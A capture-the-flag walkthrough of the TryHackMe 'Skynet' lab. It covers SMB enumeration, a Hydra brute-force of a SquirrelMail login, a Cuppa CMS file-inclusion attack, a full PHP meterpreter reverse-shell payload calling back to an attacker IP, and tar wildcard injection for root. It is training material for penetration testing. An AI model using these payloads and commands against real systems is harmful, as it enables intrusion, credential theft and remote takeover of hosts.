---
title: "Skynet TryHackMe"
date: 2020-10-12
tags: [Skynet]
excerpt: "Walkthrough"
---

## Nmap Enumeration
=========================================

There are multiple ways to perform port scans through nmap.

1.  **Zenmap** - GUI based nmap scans

2.  **Nmap from terminal**

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHmy0JoNjLYx6TZw5lo%2F-MHnoIhNye7zvhaxJwyl%2FScreen%20Shot%202020-09-21%20at%2010.17.06%20PM.png?alt=media&token=70a17efc-46a4-4409-b3c9-131b66c753e5)

>**To perform the scan from terminal follow along**
>
>Write down all the ports in a format specified below and save as target.txt
>
> 22/tcp open ssh
>
>  80/tcp open http
>
>  110/tcp open pop3
>
>  139/tcp open netbios-ssn
>
>  143/tcp open imap
>
>  445/tcp open microsoft-ds

Now run the following command, this will further enumerate the targets and find vulnerability

>nmap -iL targets.txt -A -O -sV --script=version,vuln -oA detailed_scan -T5

## SMB Enumeration | Port 139/tcp

======================================================================

SMB shares can be found using multiple methods as listed below

1.  **Enum4linux** - Enum4linux <IP>

2.  **SMBmap -** smbmap -H <IP>

3.  **SMBclient** - smbclient -L \\<IP>

>FYI: Any shares with $ after the name requires admin privilege to read FYI: If you dont have the password just press enter

>We know that the user is [milesdyson]

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHmy0JoNjLYx6TZw5lo%2F-MHnq0fFEYCQojy4mc1j%2FScreen%20Shot%202020-09-21%20at%2010.24.47%20PM.png?alt=media&token=5811a3e4-1944-4b56-ad39-25eec26ed9f7)


## Mount an SMB drive[](#mount-an-smb-drive)

---------------------------------------------

There are 2 ways to mount an SMB drive

1.  **SMBclient** - smbclient //<IP>/sharename

    -   Use **get** and **put** commands to download and upload files

    -   Remember the files will get downloaded where ever you have opened the terminal from

2.  **CIFS method**

**Mounting using SMBclient**

-------------------------------------------------------------

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHmy0JoNjLYx6TZw5lo%2F-MHnu-YylW_4gyQh6v6Y%2FScreen%20Shot%202020-09-21%20at%2010.42.23%20PM.png?alt=media&token=ea554d3d-2eba-4875-aae4-1091876b6ec3)

Once we download the files we can see what the following says:

-   Attention.txt

>A recent system malfunction has caused various passwords to be changed.
>
>All skynet employees are required to change their password after seeing this.
>
>-Miles Dyson

-   log1.txt (log2 and log3 dont have anything)

>cyborg007haloterminator
>
>terminator22596
>
>terminator219
>
>terminator20
>
>terminator1989
>
>terminator1988
>
>terminator168
>
>terminator16
>
>terminator143
>
>terminator13
>
>terminator123!@#
>
>terminator1056
>
>terminator101
>
>terminator10
>
>terminator02
>
>terminator00
>
>roboterminator
>
>pongterminator
>
>manasturcaluterminator
>
>exterminator95
>
>exterminator200
>
>dterminator
>
>djxterminator
>
>dexterminator
>
>determinator
>
>cyborg007haloterminator
>
>)s{A&2Z=F^n_E.B`

So looks like we have found a password list.

## Mounting using CIFS

-----------------------------------------------

Step 1: Navigate to mnt and create a folder called **share**

Step 2: use the command to mount the shared drive

>mount -t cifs //<IP>/<sharename> /mnt/share
>
>Then use the following command to navigate the share
>
>ls -alR /mnt/share/

## Directory Enumeration | Port 80/tcp[](#directory-enumeration-or-port-80-tcp)

================================================================================

There are multiple ways to directory enumeration all do the same thing

1.  **Dirbuster** - GUI based directory buster

2.  **Gobuster** - Terminal based directory buster

>gobuster dir --url http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads=15 -o gobuster.txt

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHot3BsCzbXwUS4B2xr%2F-MHotIApuuEzmWtuzWsu%2FScreen%20Shot%202020-09-22%20at%203.18.45%20AM.png?alt=media&token=5f13b0bc-d486-42f6-b586-a101787511cd)


Navigating to the **http://IP/squirrelmail** account we see that there is a username and password field.

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHou6i-PgzIsoGNfbfq%2FScreen%20Shot%202020-09-22%20at%203.22.24%20AM.png?alt=media&token=f11b8bfc-fe7c-40fd-b7c1-7294983d8a38)

## Bruteforce password[](#bruteforce-password)

===============================================

Now that we have the username from SMB as **milesdyson** Passwords from the **log1.txt** password list

There are 3 common ways to bruteforce passwords for websites

1.  **Hydra or Xhydra**

2.  **BurpSuite**

3.  **Manual trial and error**

>You can also use BurpSuite to bruteforce the web-app password by using the sniper feature



### Hydra[](#hydra)

>hydra -l milesdyson -P log1.txt 10.10.XX.XXX http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=0&just_logged_in=1:password incorrect"
>
>-l --> only one username
>
>-P --> list of passwords (keept it in the same directory)
>
>10.10.XX.XXX --> IP address
>
>http-post-form --> only used whenever you have a login page
>
>squirrelmail/src/redirect.php --> this is the URL whenever the default username and password fails
>
>login_username --> This is the name of the username field which we find in page source of login page
>
>^USER^ --> This will take the username in -l
>
>secretkey --> This is the name of the password field in which we find in page source of login page
>
>^PASS^ --> This will take the password in -P
>
>js_autodetect_results=0 --> This can be found in the password field which will detect if the username and password is correct
>
>just_logged_in=1 --> This can be found in the password field which will locate if the account gets logged in
>
>password incorrect --> This is what you see if the username and password is incorrect

### BurpSuite[](#burpsuite)

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHp4atZjZzyUXo_EFE2%2FScreen%20Shot%202020-09-22%20at%203.34.30%20AM.png?alt=media&token=e965d532-9673-4bea-bc1e-4d87f0493c93)


>Username: milesdyson
>
>Password: cyborg007haloterminator

### Login to SquirrelMail[](#login-to-squirrelmail)

We find the SMB password in one of the emails

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHpFE0mSMkt5AuisJfh%2FScreen%20Shot%202020-09-22%20at%204.59.08%20AM.png?alt=media&token=e967ce98-3657-4b87-bae3-c70c905ae486)

>SMB password from email: )s{A&2Z=F^n_E.B`

## Further Enumeration[](#further-enumeration)

===============================================

Using the password from the SMB email we can use smbmap to confirm if the shares have access. As we can see that milesdyson has a current read only access which was not present earlier.

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpKk7OL4VpFJ_WiK8y%2FScreen%20Shot%202020-09-22%20at%205.23.14%20AM.png?alt=media&token=26aac926-f41a-4caa-9c44-cb9ede13f3c0)

SMBmap with correct password

### Mounting the shared drives using password[](#mounting-the-shared-drives-using-password)

By now you should be proficient in mounting drives using smbclient and CIFS. I will be using CIFS(above) moving forward.

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpO2PyXKfSmv5f3n_g%2FScreen%20Shot%202020-09-22%20at%205.37.32%20AM.png?alt=media&token=4b40184f-6793-4514-be50-0014fcf69272)

Above CIFS | Below SMBclient

We can navigate to the important.txt file which is in the notes directory using the command cat /mnt/share/notes/important.txt

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpP9FwbRKk0VVh0UNg%2FScreen%20Shot%202020-09-22%20at%205.41.34%20AM.png?alt=media&token=ccd9efbb-aa8e-4514-b993-2c36156cb273)

Navigating to the hidden drive http://10.10.37.86/45kra24zxs28v3yd we find miles dyson

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpQ66wr-GPDNdyS19p%2FScreen%20Shot%202020-09-22%20at%205.46.41%20AM.png?alt=media&token=0ad9332c-d99c-4d99-9e69-220c2210cf6e)

## CuppaCMS[](#cuppacms)

=========================

Gobusting the URL we find a hidden admin page for cuppa CMS

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpSGUmbAfqm06gVdLo%2F-MHpSuMC50Bh3PM3Y30c%2FScreen%20Shot%202020-09-22%20at%205.58.46%20AM.png?alt=media&token=b3e156f0-d1a7-41c4-998b-f29af013e7ac)

Using searchsploit we find that vulnerability of Local/Remote File Inclusion exists for Cuppa CMS.

Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion

[www.exploit-db.com](https://www.exploit-db.com/exploits/25971)

The following are the LFI vulnerabilities

<http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?>  <http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd>

So trying that in our system we can replace target with IP and delete the directory cuppa.

>http://10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpUoLwtrspcv-lgc_U%2F-MHpWU_r2swnsSLxlW7i%2FScreen%20Shot%202020-09-22%20at%206.14.36%20AM.png?alt=media&token=c1de95ae-7b98-4038-97da-fc00294b3f31)

NT password file

## User Level Shell[](#user-level-shell)

=========================================

Creating a reverse shell can be achieved via 2 methods

1.  Metasploit

2.  Netcat

### Metasploit method[](#metasploit-method)

-------------------------------------------

Run the following commands

>msfdb run
>
>use exploit/multi/handler
>
>search php type:payload
>
>set payload php/meterpreter/reverse_tcp
>
>set LHOST tun0
>
>set LPORT 4444
>
>set exitonsession false
>
>run
>
>Or
>
>exploit -j ----> to run session in background
>
>jobs -v -----> to show all the jobs

Generate payload

>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.35.24 LPORT=4444 -f raw > terminator.php

Once the PHP payload is created you need to comment the PHP in the beginning and close the php tag in the end

><?php  /**/  error_reporting(0);  $ip  =  '10.2.35.24';  $port  =  4444;  if  (($f  =  'stream_socket_client')  &&  is_callable($f))  {  $s  =  $f("tcp://{$ip}:{$port}");  $s_type  =  'stream';  }  if  (!$s  &&  ($f  = 'fsockopen')  &&  is_callable($f))  {  $s  =  $f($ip,  $port);  $s_type  = 'stream';  }  if  (!$s  &&  ($f  = 'socket_create')  &&  is_callable($f))  {  $s  =  $f(AF_INET,  SOCK_STREAM,  SOL_TCP);  $res  = @socket_connect($s,  $ip,  $port);  if  (!$res)  {  die();  }  $s_type  = 'socket';  }  if  (!$s_type)  {  die('no socket funcs');  }  if  (!$s)  {  die('no socket');  }  switch  ($s_type)  {  case 'stream':  $len  =  fread($s,  4);  break;  case 'socket':  $len  =  socket_read($s,  4);  break;  }  if  (!$len)  {  die();  }  $a  =  unpack("Nlen",  $len);  $len  =  $a['len'];  $b  = '';  while  (strlen($b)  <  $len)  {  switch  ($s_type)  {  case 'stream':  $b  .=  fread($s,  $len-strlen($b));  break;  case 'socket':  $b  .=  socket_read($s,  $len-strlen($b));  break;  }  }  $GLOBALS['msgsock']  =  $s;  $GLOBALS['msgsock_type']  =  $s_type;  if  (extension_loaded('suhosin')  &&  ini_get('suhosin.executor.disable_eval'))  {  $suhosin_bypass=create_function('',  $b);  $suhosin_bypass();  }  else  {  eval($b);  }  die();?>

Setup the python simple http server

>python3 -m 'http.server'

Executing the php in the browser to gain session

>10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.35.24:8000/terminator.php?

### Netcat Method[](#netcat-method)

-----------------------------------

-   Download php reverse shell from [pentest monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and rename it terminator.php

-   Edit the IP to your IP

-   Edit the Port to 1234(anything you want)

-   Start a netcat listener in a terminal prompt - $ nc -nlvp 1234

-   Execute the link above

##Privilege Escalation[](#privilege-escalation)

=================================================

Running [Linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) we get a very interesting cron job as

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHsfSdXnFp_TQ6AmIzx%2F-MHsuFNk8bA232Fu2El0%2FScreen%20Shot%202020-09-22%20at%209.35.24%20PM.png?alt=media&token=187bac1e-3bd5-4bb4-b501-d11bd7f88672)

Cronjobs of backup running as root

How to know if its a cronjob? Based on the three *** it lets us know about the job if its hourly or daily Or you can cat /etc/crontab and find it there

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHsfSdXnFp_TQ6AmIzx%2F-MHsyViLIxRGjHGr-ixx%2FScreen%20Shot%202020-09-22%20at%2010.19.11%20PM.png?alt=media&token=1758d30f-72b7-4e44-ae7a-f642319cb661)

Cronjob running backup.sh

Reading the backup.sh file using cat command we find the following

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHsfSdXnFp_TQ6AmIzx%2F-MHsxMzWeR1p7r5pIdfd%2FScreen%20Shot%202020-09-22%20at%2010.00.38%20PM.png?alt=media&token=f96a59d6-c8bf-4cb0-8750-48ce1b031a82)

Reading the contents of backup.sh

So its reading a tar command and calling the backup.tgz file and the system is reading that from the html folder which is meant for hosting something.

Doing a bit of google search with "[tar privilege escalation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)" we find this page on [hacking articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) which explains the vulnerability with tar.

Following Tar Wildcard Injection Method 1

>msfvenom -p cmd/unix/reverse_netcat lhost=<YOURIP> lport=4444 R

>Create a nc session in a different window to catch the root shell
>
>nc -nlvp 4444

Navigate to /var/www/html and input the commands as follows

>echo "<YOUR  MSFVENOM  CODE  GOES  HERE"  > shell.sh
>
>echo "" > "--checkpoint-action=exec=sh shell.sh"
>
>echo "" > --checkpoint=1
>
>tar cf archive.tar *

Now you have the root shell as root@skynet along with our shell.sh file which we created

![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHt-cWR42gX7TXkw0Es%2F-MHt4e3OvFlgT7-fepJm%2FScreen%20Shot%202020-09-22%20at%2010.46.20%20PM.png?alt=media&token=b3f97960-a030-48fb-b8bf-27b86d1e5824)

Root shell

You can procure the root flag from cat ~/root/root.txt

Enjoy!
